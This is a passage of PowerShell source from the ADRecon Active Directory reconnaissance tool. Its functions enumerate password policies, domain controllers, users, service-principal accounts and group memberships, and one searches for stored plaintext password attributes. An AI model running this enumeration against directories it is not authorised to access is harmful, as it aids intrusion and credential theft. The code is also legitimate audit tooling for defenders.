            $Obj | Add-Member -MemberType NoteProperty -Name "PCI DSS v3.2.1" -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType NoteProperty -Name "ASD ISM" -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType NoteProperty -Name "2018 ISM Controls" -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType NoteProperty -Name "CIS Benchmark 2016" -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ObjValues
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning "[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password Policy"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_.AppliesTo.Count); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_.AppliesTo[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.TrimStart(",")
                }
                $ObjValues = @("Name", $($_.Name), "Applies To", $AppliesTo, "Enforce password history", $_.PasswordHistoryCount, "Maximum password age (days)", $_.MaxPasswordAge.days, "Minimum password age (days)", $_.MinPasswordAge.days, "Minimum password length", $_.MinPasswordLength, "Password must meet complexity requirements", $_.ComplexityEnabled, "Store password using reversible encryption", $_.ReversibleEncryptionEnabled, "Account lockout duration (mins)", $_.LockoutDuration.minutes, "Account lockout threshold", $_.LockoutThreshold, "Reset account lockout counter after (mins)", $_.LockoutObservationWindow.minutes, "Precedence", $($_.Precedence))
                For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = "(objectClass=msDS-PasswordSettings)"
            $ObjSearcher.SearchScope = "Subtree"
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRFineGrainedPasswordPolicy] Error while enumerating the Fine Grained Password Policy"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCount($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_.Properties.'msds-psoappliesto'.Count); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_.Properties.'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.TrimStart(",")
                    }
                        $ObjValues = @("Name", $($_.Properties.name), "Applies To", $AppliesTo, "Enforce password history", $($_.Properties.'msds-passwordhistorylength'), "Maximum password age (days)", $($($_.Properties.'msds-maximumpasswordage') /-864000000000), "Minimum password age (days)", $($($_.Properties.'msds-minimumpasswordage') /-864000000000), "Minimum password length", $($_.Properties.'msds-minimumpasswordlength'), "Password must meet complexity requirements", $($_.Properties.'msds-passwordcomplexityenabled'), "Store password using reversible encryption", $($_.Properties.'msds-passwordreversibleencryptionenabled'), "Account lockout duration (mins)", $($($_.Properties.'msds-lockoutduration')/-600000000), "Account lockout threshold", $($_.Properties.'msds-lockoutthreshold'), "Reset account lockout counter after (mins)", $($($_.Properties.'msds-lockoutobservationwindow')/-600000000), "Precedence", $($_.Properties.'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                        {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name "Policy" -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDomainController
{
<#
.SYNOPSIS
    Returns the domain controllers for the current (or specified) forest.

.DESCRIPTION
    Returns the domain controllers for the current (or specified) forest.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomainControllers = Get-ADDomainController -Filter *
        }
        Catch
        {
            Write-Warning "[Get-ADRDomainController] Error while enumerating DomainController Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        # DC Info
        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers))"
            # DC Info
            $DCObj = @()
            $ADDomainControllers | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Domain" -Value $_.Domain
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $_.Site
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "IPv4Address" -Value $_.IPv4Address
                $OSVersion = [ADRecon.ADWSClass]::CleanString($($_.OperatingSystem + " " + $_.OperatingSystemHotfix + " " + $_.OperatingSystemServicePack + " " + $_.OperatingSystemVersion))
                $Obj | Add-Member -MemberType NoteProperty -Name "Operating System" -Value $OSVersion
                Remove-Variable OSVersion
                $Obj | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $_.HostName
                If ($_.OperationMasterRoles -like 'DomainNamingMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $false
                }
                If ($_.OperationMasterRoles -like 'SchemaMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $false
                }
                If ($_.OperationMasterRoles -like 'InfrastructureMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $false
                }
                If ($_.OperationMasterRoles -like 'RIDMaster')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $false
                }
                If ($_.OperationMasterRoles -like 'PDCEmulator')
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $true
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $false
                }
                $DCSMBObj = [ADRecon.PingCastleScannersSMBScanner]::GetPSObject($_.IPv4Address)
                ForEach ($Property in $DCSMBObj.psobject.Properties)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name $Property.Name -Value $Property.value
                }
                $DCObj += $Obj
            }
            Remove-Variable ADDomainControllers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainController] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If ($ADDomain.DomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers))"
            # DC Info
            $DCObj = @()
            $ADDomain.DomainControllers | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Domain" -Value $_.Domain
                $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $_.SiteName
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value ($_.Name -Split ("\."))[0]
                $Obj | Add-Member -MemberType NoteProperty -Name "IPAddress" -Value $_.IPAddress
                $Obj | Add-Member -MemberType NoteProperty -Name "Operating System" -Value $_.OSVersion
                $Obj | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $_.Name
                If ($null -ne $_.Roles)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Naming" -Value $($_.Roles.Contains("NamingRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Schema" -Value $($_.Roles.Contains("SchemaRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "Infra" -Value $($_.Roles.Contains("InfrastructureRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "RID" -Value $($_.Roles.Contains("RidRole"))
                    $Obj | Add-Member -MemberType NoteProperty -Name "PDC" -Value $($_.Roles.Contains("PdcRole"))
                }
                Else
                {

                    "Naming", "Schema", "Infra", "RID", "PDC" | ForEach-Object {
                        $Obj | Add-Member -MemberType NoteProperty -Name $_ -Value $false
                    }
                }
                $DCSMBObj = [ADRecon.PingCastleScannersSMBScanner]::GetPSObject($_.IPAddress)
                ForEach ($Property in $DCSMBObj.psobject.Properties)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name $Property.Name -Value $Property.value
                }
                $DCObj += $Obj
            }
            Remove-Variable ADDomain
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUser
{
<#
.SYNOPSIS
    Returns all users in the current (or specified) domain.

.DESCRIPTION
    Returns all users in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,middleName,mobile,'msDS-AllowedToDelegateTo','msDS-SupportedEncryptionTypes',Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRUser] Error while enumerating User Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Try
            {
                $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                $PassMaxAge = $ADpasspolicy.MaxPasswordAge.days
                Remove-Variable ADpasspolicy
            }
            Catch
            {
                Write-Warning "[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 days"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $PassMaxAge = 90
            }

            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserObj = [ADRecon.ADWSClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(samAccountType=805306368)"
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
        $ObjSearcher.PropertiesToLoad.AddRange(("accountExpires","admincount","c","canonicalname","company","department","description","distinguishedname","givenName","homedirectory","info","lastLogontimestamp","mail","manager","middleName","mobile","msDS-AllowedToDelegateTo","msDS-SupportedEncryptionTypes","name","ntsecuritydescriptor","objectsid","primarygroupid","profilepath","pwdLastSet","samaccountName","scriptpath","sidhistory","sn","title","useraccountcontrol","userworkstations","whenchanged","whencreated"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRUser] Error while enumerating User Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $PassMaxAge = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000)
            If (-Not $PassMaxAge)
            {
                Write-Warning "[Get-ADRUser] Error retrieving Max Password Age from the Default Password Policy. Using value as 90 days"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $PassMaxAge = 90
            }

            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers))"
            $UserObj = [ADRecon.LDAPClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUserSPN
{
<#
.SYNOPSIS
    Returns all user service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all user service principal name (SPN) in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = @( Get-ADObject -LDAPFilter "(&(samAccountType=805306368)(servicePrincipalName=*))" -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl -ResultPageSize $PageSize )
        }
        Catch
        {
            Write-Warning "[Get-ADRUserSPN] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Write-Verbose "[*] Total UserSPNs: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserSPNObj = [ADRecon.ADWSClass]::UserSPNParser($ADUsers, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("name","description","memberof","samaccountname","serviceprincipalname","primarygroupid","pwdlastset","useraccountcontrol"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRUserSPN] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            Write-Verbose "[*] Total UserSPNs: $([ADRecon.LDAPClass]::ObjectCount($ADUsers))"
            $UserSPNObj = [ADRecon.LDAPClass]::UserSPNParser($ADUsers, $Threads)
            Remove-Variable ADUsers
        }
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }

}

#TODO
Function Get-ADRPasswordAttributes
{
<#
.SYNOPSIS
    Returns all objects with plaintext passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all objects with plaintext passwords in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.

.LINK
    https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/com.ibm.aix.security/ad_password_attribute_selection.htm
    https://msdn.microsoft.com/en-us/library/cc223248.aspx
    https://msdn.microsoft.com/en-us/library/cc223249.aspx
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter '(|(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))' -ResultPageSize $PageSize -Properties *
        }
        Catch
        {
            Write-Warning "[Get-ADRPasswordAttributes] Error while enumerating Password Attributes"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers))"
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(UserPassword=*)(UnixUserPassword=*)(unicodePwd=*)(msSFU30Password=*))"
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRPasswordAttributes] Error while enumerating Password Attributes"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $cnt = [ADRecon.LDAPClass]::ObjectCount($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning "[*] Total PasswordAttribute Objects: $cnt"
            }
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroup
{
<#
.SYNOPSIS
    Returns all groups in the current (or specified) domain.

.DESCRIPTION
    Returns all groups in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroup] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups))"
            $GroupObj = [ADRecon.ADWSClass]::GroupParser($ADGroups, $Threads)
            Remove-Variable ADGroups
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=group)"
        $ObjSearcher.PropertiesToLoad.AddRange(("admincount","canonicalname", "distinguishedname", "description", "grouptype","samaccountname", "sidhistory", "managedby", "objectsid", "whencreated", "whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGroup] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups))"
            $GroupObj = [ADRecon.LDAPClass]::GroupParser($ADGroups, $Threads)
            Remove-Variable ADGroups
        }
    }

    If ($GroupObj)
    {
        Return $GroupObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroupMember
{
<#
.SYNOPSIS
    Returns all groups and their members in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and their members in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter '(|(memberof=*)(primarygroupid=*))' -Properties DistinguishedName,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating GroupMember Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers))"
            $GroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($Protocol -eq 'LDAP')
    {

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=group)"
        $ObjSearcher.PropertiesToLoad.AddRange(("samaccountname", "objectsid"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRGroupMember] Error while enumerating Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(memberof=*)(primarygroupid=*))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname", "dnshostname", "primarygroupid", "memberof", "samaccountname", "samaccounttype"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADGroupMembers = $ObjSearcher.FindAll()
        }
        Catch
        {
